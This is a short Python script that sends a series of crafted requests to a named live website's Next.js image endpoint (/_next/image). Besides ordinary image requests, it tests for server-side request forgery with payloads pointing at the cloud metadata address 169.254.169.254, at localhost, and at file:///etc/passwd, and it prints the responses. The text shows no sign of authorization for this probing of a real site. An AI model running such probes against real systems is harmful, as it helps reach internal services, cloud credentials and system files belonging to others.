import requests, urllib.parse
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
H={"User-Agent":UA}
B="https://www.infinitycapital.bh"
real="https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
tests={
 "real_1080": "/_next/image?url="+urllib.parse.quote(real,safe='')+"&w=1080&q=75",
 "real_640":  "/_next/image?url="+urllib.parse.quote(real,safe='')+"&w=640&q=40",
 "real_3840": "/_next/image?url="+urllib.parse.quote(real,safe='')+"&w=3840&q=90",
 "bogus_host":"/_next/image?url="+urllib.parse.quote("http://nonexistent-zzz.invalid/x.jpg",safe='')+"&w=100",
 "metadata":  "/_next/image?url="+urllib.parse.quote("http://169.254.169.254/latest/meta-data/",safe='')+"&w=100",
 "local":     "/_next/image?url="+urllib.parse.quote("http://127.0.0.1:80/",safe='')+"&w=100",
 "file_etc":  "/_next/image?url="+urllib.parse.quote("file:///etc/passwd",safe='')+"&w=100",
 "noext":     "/_next/image?url="+urllib.parse.quote("http://images.ctfassets.net/x",safe='')+"&w=100",
 "onlyurl":   "/_next/image?url="+urllib.parse.quote(real,safe=''),
 "now":       "/_next/image?w=100&q=75",
}
for k,v in tests.items():
    try:
        r=requests.get(B+v,headers=H,timeout=25,allow_redirects=False)
        print(k, r.status_code, len(r.content), r.headers.get('content-type'), dict(list(r.headers.items())[:0]))
        print("   body:", r.content[:180])
    except Exception as e:
        print(k,"ERR",e)
